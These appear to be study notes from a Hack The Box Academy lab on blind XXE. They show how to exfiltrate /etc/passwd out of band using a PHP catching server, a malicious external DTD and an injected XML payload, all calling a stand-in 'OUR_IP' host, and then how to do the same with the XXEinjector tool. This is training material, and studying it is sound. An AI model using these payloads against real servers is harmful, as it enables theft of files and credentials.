# Blind Data Exfiltration - [LINK](https://academy.hackthebox.com/app/module/134/section/1207)


Blind XXE occurs when the web application is completely silent: it does not reflect your XML input and it suppresses all parser error messages. To extract data in a blind scenario, you must use Out-of-Band (OOB) Exfiltration. This involves forcing the target server to make an outbound HTTP (or DNS) request to a server you control, appending the target file's contents as a URL parameter.

## Manual OOB Exfiltration

**1. Create the Catching Server**
Create a PHP script (`index.php`) on your attack machine that listens for incoming requests, base64-decodes the `content` parameter, and logs it to the terminal.

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

```

Start the listener on port 8000:

```bash
php -S 0.0.0.0:8000

```

**2. Host the Malicious DTD**
Create `xxe.dtd` on your attack machine. This DTD tells the target to read the file, base64 encode it (to avoid breaking the URL structure), and then append it to the URL of your catching server.

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

```

**3. Inject the Payload**
Send the following XML payload to the target. It fetches your external DTD, resolves the entities, and triggers the outbound HTTP request.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

```

*Observe your PHP server terminal; it will receive the request and print the decoded contents of `/etc/passwd`.*

## Automated OOB Exfiltration (XXEinjector)

The `XXEinjector` tool automates the process of setting up listeners, generating DTDs, and extracting files via OOB requests.

**1. Prepare the Request File**
Intercept the vulnerable request using Burp Suite and save it to a file (e.g., `/tmp/xxe.req`). Remove the original XML body and replace it with the `XXEINJECT` marker.

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
... [headers truncated] ...
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

```

**2. Execute XXEinjector**
Run the tool, specifying your IP, port, the target file you want to read, and the exfiltration method (HTTP OOB with PHP filters).

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

```

**3. Retrieve the Exfiltrated File**
Because the tool receives base64-encoded data, it does not print it directly to the console. The decoded file is automatically saved in the tool's `Logs` directory.

```bash
cat Logs/<TARGET_IP>/etc/passwd.log

```
